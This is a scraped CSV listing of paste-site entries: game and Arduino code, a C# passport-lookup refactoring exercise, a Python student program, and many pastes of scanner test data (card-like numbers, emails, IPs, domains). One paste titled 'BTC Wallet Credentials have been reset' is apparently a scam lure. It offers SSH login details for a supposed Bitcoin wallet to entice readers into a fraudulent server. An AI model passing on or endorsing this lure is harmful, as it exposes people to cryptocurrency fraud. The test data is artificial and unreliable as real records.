id,title,username,language,date,content
vQ4Xc8pC,Dich,MaoChessy,C#,Tuesday 4th of July 2023 12:58:09 PM CDT,"using System;
using Code.Csharp.Systems.CharacterSystems.Ext.SaveData;
using Code.Csharp.Systems.SaverSystem;
using Code.Csharp.Systems.SaverSystem.ProviderData;
using Code.Csharp.Systems.Scenes.App;
using Code.Csharp.Systems.UI.SettingScreen;
using Plugins.MaoUtility.Systems.DILocator.Atr;
using Plugins.MaoUtility.Systems.IoUi.Btns;
using Plugins.MaoUtility.Systems.IoUi.Core;
using UnityEngine;

namespace Code.Csharp.Systems.CharacterSystems.Ext.IO
{
    public class CharacterControlSettingKeyboardIoGroupHandler : IoGroupHandler, IUIPanelSetting
    {
        public IoBtnKey Forward;
        public IoBtnKey Back;
        public IoBtnKey Right;
        public IoBtnKey Left;
        public IoBtnKey Jump;
        public IoBtnKey DashAndRun;
        public IoBtnKey Crouch;
        public IoBtnKey Interact;
        
        
        public void SetActivated(bool isActivated)
        {
            if(isActivated) Register<CharacterControlSettingKeyboardIoGroupHandler>();    
            else Unregister<CharacterControlSettingKeyboardIoGroupHandler>();
        }
    }

    [DiMark]
    public class CharacterControlSettingKeyboardIoIniter : IoIniter<CharacterControlSettingKeyboardIoGroupHandler>
    {
        [DiInject] private AppEntity _appEntity;
        private CharacterControlMoveSettingKeyboard _data;

        [DiInject]
        private void Init() 
            => _data = _appEntity.Get<SaveEntity>().Get<ProviderSaveData>().GetData<CharacterControlMoveSettingKeyboard>();

        public override void Register(CharacterControlSettingKeyboardIoGroupHandler panel)
        {
            base.Register(panel);
            panel.Back.Init(()=>_data.KeyBack.Value, x=>_data.KeyBack.Value = x);
            panel.Forward.Init(()=>_data.KeyForward.Value, x=>_data.KeyForward.Value = x);
            panel.Right.Init(()=>_data.KeyRight.Value, x=>_data.KeyRight.Value = x);
            panel.Left.Init(()=>_data.KeyLeft.Value, x=>_data.KeyLeft.Value = x);
            panel.Jump.Init(()=>_data.KeyJump.Value, x=>_data.KeyJump.Value = x);
            panel.Crouch.Init(()=>_data.KeyCrouch.Value, x=>_data.KeyCrouch.Value = x);
            panel.DashAndRun.Init(()=>_data.KeyRunAndDash.Value, x=>_data.KeyRunAndDash.Value = x);
            panel.Interact.Init(()=>_data.KeyInteract.Value, x=>_data.KeyInteract.Value = x);
        }

        public override void Unregister(CharacterControlSettingKeyboardIoGroupHandler panel)
        {
            base.Unregister(panel);
            panel.Back.Init(()=>default, x=>{});
            panel.Forward.Init(()=>default, x=>{});
            panel.Right.Init(()=>default, x=>{});
            panel.Left.Init(()=>default, x=>{});
            panel.Jump.Init(()=>default, x=>{});
            panel.Crouch.Init(()=>default, x=>{});
            panel.DashAndRun.Init(()=>default, x=>{});
            panel.Interact.Init(()=>default, x=>{});
        }
    }

    public class ConnectorCharacterControlSettingKeyboardIoGroupHandlerHandlerAndIniter : ConnectorTypeForIoManager
    {
        public override Type TargetTypeHandler => typeof(CharacterControlSettingKeyboardIoGroupHandler);
        public override Type GetTypeIniter() => typeof(CharacterControlSettingKeyboardIoIniter);
    }
    
    [DiMark]
    public class CharacterControllSettingKeyboardSettingPanel : SettingPanel<CharacterControlMoveSettingKeyboard>
    {
        [DiInject] private AppEntity _appEntity;
        private CharacterControlMoveSettingKeyboard _data;

        [DiInject]
        private void Init() 
            => _data = _appEntity.Get<SaveEntity>().Get<ProviderSaveData>().GetData<CharacterControlMoveSettingKeyboard>();

        protected override CharacterControlMoveSettingKeyboard GetData() => _data;
    }
}"
HzDXmGZN,NapilnikRefactoring,anton_zhigalov1,C#,Tuesday 4th of July 2023 12:52:23 PM CDT," private void CheckButtonClick(object sender, EventArgs args)
        {
            const string emptyString = "" "";

            if (_passportTextbox.Text.Trim() == emptyString)
            {
                int num = (int)MessageBox.Show(""Введите серию и номер паспорта"");
            }
            else
            {
                string rawData = _passportTextbox.Text.Trim().Replace(emptyString, string.Empty);
                VerificationCompliance(rawData);
            }
        }

        private void VerificationCompliance(string rawData)
        {
            int maxCountLength = 10;

            if (rawData.Length < maxCountLength)
            {
                _textResult.Text = ""Неверный формат серии или номера паспорта"";
            }
            else
            {
                string commandText = string.Format($""select * from passports where"" +
                      $"" num='0' limit 1;, {(object)Form.ComputeSha256Hash(rawData)}"");
                string connectionString = string.Format($""Data Source= "" +
                    $""{Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)} \\db.sqlite"");
                TryConnection(commandText, connectionString);
            }
        }

        private void TryConnection(string commandText, string connectionString)
        {
            SQLiteConnection connection = new SQLiteConnection(connectionString);
            SQLiteDataAdapter sqLiteDataAdapter = new SQLiteDataAdapter(new SQLiteCommand(commandText, connection));
            DataTable dataTable = new DataTable();
            connection.Open();

            try
            {
                sqLiteDataAdapter.Fill(dataTable);
                FindByDate(dataTable);
                connection.Close();

            }
            catch (SQLiteException liteException)
            {
                int errorCode = 1;

                if (liteException.ErrorCode != errorCode)
                    return;
                int num = (int)MessageBox.Show(""Файл db.sqlite не найден."" +
                                     "" Положите файл в папку вместе с exe."");
            }
        }

        private void FindByDate(DataTable dataTable)
        {
            if (dataTable.Rows.Count > 0)
                GetTextResult(dataTable);
            else
                _textResult.Text = $""Паспорт «{_passportTextbox.Text}»"" +
                $"" в списке участников дистанционного голосования НЕ НАЙДЕН"";
        }

        private TextResult GetTextResult(DataTable dataTable)
        {
            const string accessWasGranted = ""ПРЕДОСТАВЛЯЛСЯ"";
            const string accessWasNotGranted = ""НЕ ПРЕДОСТАВЛЯЛСЯ"";

            if (Convert.ToBoolean(dataTable.Rows[0].ItemArray[1]) == false)
                return _textResult.Text = ShowTextResult(accessWasNotGranted);

            return _textResult.Text = ShowTextResult(accessWasGranted);
        }

        private string ShowTextResult(string text)
        {
            return $""По паспорту «{_passportTextbox.Text}» доступ к бюллетеню"" +
                   $"" на дистанционном электронном голосовании {text}"";
        }"
ynRUpXf9,BTC Wallet Credentials have been reset,posserestu_37,GetText,Tuesday 4th of July 2023 12:43:52 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are preciousannehn:H7QHSp on 45.9.148.244
You can connect via SSH.
Regards"
aEetpLAf,integrador v1 sin funciones,teslariu,Python,Tuesday 4th of July 2023 12:25:49 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Una universidad desea crear un programa para contabilizar los cursos que
tiene cada alumno. Para ello se debe realizar primero una aplicación
de consola la cual debe solicitar el nombre de un alumno y la cantidad 
de cursos en la que se encuentra inscripto. Estos dos valores deben 
almacenarse como una lista de dos elementos (el nombre y la cantidad
de cursos como un número entero) en una lista de alumnos.

Una vez hecho esto, se debe hacer que el programa, al iniciar, pregunte 
cuál de las siguientes dos operaciones se debe realizar: ingresar un
alumno o ver la lista de alumnos ingresados. 
""""""
# defino la estructura de datos (como voy a guardar los datos)
# alumnos = [ [""Juan"", 3], [""Ana"",5], [""Josefa"",6] ]
alumnos = []

# defino el menu del programa
menu = """"""
Ingrese el número de la operación que desea ejecutar:
1 - Ingresar un alumno.
2 - Ver la lista de los alumnos ingresados.
3 - Salir.
""""""

# el programa se debe ejecutar hasta que el usuario ingrese opcion 4
while True:
    print(menu)
    opcion = input("">>> "")
    
    if opcion == ""1"":
        nombre = input(""Ingrese su nombre: "")
        cursos = int(input(""Ingrese los cursos: ""))
        alumnos.append([nombre, cursos])
        print(""¡El alumno fue añadido a la lista!"")
        
    elif opcion == ""2"":
        """"""
        Pablo - 3 cursos
        """"""
        print(""Lista de alumnos:"")
        for alumno in alumnos:
            print(f""{alumno[0]} - {alumno[1]} cursos"")
                
        
            
    elif opcion == ""3"":
        print(""Gracias por utilizar este programa"")
        break
            
    else:
        print(""La opción ingresada no es correcta, vuelva a intentarlo."")
"
v2dMFAqM,jeu multimodes,williamcaillaud,C++,Tuesday 4th of July 2023 12:00:53 PM CDT,"

/**********************************************************************************
 * *******                          LIBRAIRIES                            ******* * 
 **********************************************************************************/


#include <SPI.h>                // appelle la librairie pour la liaison echange de données
#include <Wire.h>               // appelle la librairie pour la liaison echange de données I2C
#include <Adafruit_GFX.h>       
#include <Adafruit_SH110X.h>    // pour faire fonctionner l'écran OLED 

#define i2c_Adress 0x3c         // defini l'adresse I2C de l'ecran, ici 0x3C
#define SCREEN_WIDTH 128        // defini que l'écran fait 128 pixel de large
#define SCREEN_HEIGHT 64        // defini que l'écran fait 64 pixel de haut
#define OLED_RESET -1   //   QT-PY / XIAO
Adafruit_SH1106G display = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
/* ********************************************************************************
 * ***************                  CONSTANTES                     ****************
 ******************************************************************************** */ 
const int downPin = 2;     // the number of the pushbutton 1 pin
const int upPin = 3;     // the number of the pushbutton 2 pin
const int enterPin = 4;     // the number of the pushbutton 3 pin
const int backPin = 5;     // the number of the pushbutton 4 pin
const int startPin = 8;     // the number of the pushbutton Start Button pin
const int ledPin1B =  14;     // the number of the LED pin

/* ********************************************************************************
 * ***************                  VARIABLES                      ****************
 ******************************************************************************** */


int selected = 0;             // selection du menu de jeu
int entered = 0;             // validation du menu de jeu
int selectedsnip = 0;           // selection type de jeu sniper 
int entered1 = 0;          // validation du type de jeu snipe
int validMenu = 0;
int selected1 =0 ;


/* ********************************************************************************
 * ***************                    SETUP                        ****************
 ******************************************************************************** */


void setup() {

  Serial.begin(9600);                    // initialise la liaison serie à 9600 BAUD
  display.begin(i2c_Adress, true);       // initialise la liaison avec l'écran
  
  // initialize the LED pin as an output:
  pinMode(ledPin1B, OUTPUT);

  // initialize the pushbutton pin as an input:
  pinMode(downPin, INPUT);
  pinMode(upPin, INPUT);
  pinMode(enterPin, INPUT);
  pinMode(backPin, INPUT);
  pinMode(startPin, INPUT);

 display.clearDisplay();                // efface l'écran
  validMenu = 1; 
}
 
void loop() {

  displaymenu(); 

}


void displaymenu() {
  if (validMenu == 1){
    int down = digitalRead(downPin);
    int up = digitalRead(upPin);
    int enter = digitalRead(enterPin);
    int back = digitalRead(backPin);
    int start = digitalRead(startPin);
 

  display.drawRoundRect(2,2,126,62,10,SH110X_WHITE);
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(10, 15);
  display.print(""zone1"");
  display.display();
 
  display.setCursor(10, 30);
  display.print(""zone2"");
  display.display();

  display.setCursor(10, 45);
  display.print(""CONFIGURATION"");
  display.display();
   
    if (up == LOW){
      selected = selected +1;
      delay(200);
      if(selected >= 3){
        selected = 0;
      }
    }
    if (down == LOW){
      selected = selected -1;
      delay(200);
      if (selected <= -1){
        selected = 2;
      }
    }
    switch(selected){
      case 0:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        if (enter == LOW){
          display.clearDisplay();
          validMenu = 2;
          menu1();  
        }
        break;

      case 1:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        break;
        
      case 2:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_WHITE);
        display.display();
        break;

    } 
  }
}




void menu1() {
  if (validMenu == 2){
    int down1 = digitalRead(downPin);
    int up1 = digitalRead(upPin);
    int enter1 = digitalRead(enterPin);
    int back1 = digitalRead(backPin);
    int start1 = digitalRead(startPin);
 

  display.drawRoundRect(2,2,126,62,10,SH110X_WHITE);
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(10, 15);
  display.print(""Jeu 1"");
  display.display();
 
  display.setCursor(10, 30);
  display.print(""Jeu 2"");
  display.display();

  display.setCursor(10, 45);
  display.print(""RETOUR"");
  display.display();
   
    if (up1 == LOW){
      selected1 = selected1 +1;
      delay(200);
      if(selected1 >= 3){
        selected1 = 0;
      }
    }
    if (down1 == LOW){
      selected1 = selected1 -1;
      delay(200);
      if (selected1 <= -1){
        selected1 = 2;
      }
    }
    switch(selected1){
      case 0:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        if (enter1 == LOW){
          display.clearDisplay();
          validMenu = 3;
          jeu1();  
        }
        break;

      case 1:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_WHITE);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_BLACK);
        display.display();
        break;
        
      case 2:
        display.drawRoundRect(7, 12, 44, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 27, 77, 13, 5, SH110X_BLACK);
        display.drawRoundRect(7, 42, 85, 13, 5, SH110X_WHITE);
        display.display();
        break;

    } 
  }
}
  


"
uTVnJVp7,Untitled,backparsnip,Bash,Tuesday 4th of July 2023 11:38:40 AM CDT,"tamsin.kilduff@greencastle.org.uk
 
BM Testing
This is July 4 '23 testing 1738
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6e"
BX4Py40r,Untitled,wheresTheAnyKey,Bash,Tuesday 4th of July 2023 11:38:21 AM CDT,"

Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, gradually-close@castlelandscape.co.uk also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
mU2ZS0yu,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:18 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
8xPiQHVR,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:16 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
BTdmtFi8,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:15 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
QsnczdGa,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:13 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
8RPRtUQ9,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:11 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
3gjnC5bu,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:09 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
6U06U4BP,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:06 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
Tp3T5q4a,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:05 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
LhMXt9Ja,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:03 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
rCgc7WLm,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 4th of July 2023 11:33:01 AM CDT,"Pasted at: 04/07/2023 17:33
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
